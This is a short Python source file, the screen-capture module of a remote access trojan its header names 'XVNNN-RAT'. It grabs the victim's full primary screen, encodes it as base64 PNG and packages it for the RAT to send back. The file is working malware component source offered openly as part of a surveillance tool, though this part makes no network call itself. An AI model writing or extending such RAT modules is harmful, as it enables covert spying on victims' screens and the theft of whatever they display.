"""
Screen capture module for XVNNN-RAT
Author: Ali Zafar (alizafarbati@gmail.com)
"""

import mss
from PIL import Image
import io
import base64
import logging

logger = logging.getLogger(__name__)

class ScreenModule:
    """Screen capture module"""
    
    def __init__(self):
        self.name = "screen"
    
    def capture(self):
        """Capture screenshot"""
        try:
            with mss.mss() as sct:
                # Capture entire screen
                monitor = sct.monitors[1]
                screenshot = sct.grab(monitor)
                
                # Convert to image
                img = Image.frombytes('RGB', screenshot.size, screenshot.bgra, 'raw', 'BGRX')
                
                # Convert to bytes
                buffer = io.BytesIO()
                img.save(buffer, format='PNG', optimize=True, quality=85)
                img_data = base64.b64encode(buffer.getvalue()).decode()
                
                return {'type': 'screenshot', 'image': img_data}
        except Exception as e:
            logger.error(f"Screenshot error: {e}")
            return {'type': 'screenshot', 'error': str(e)}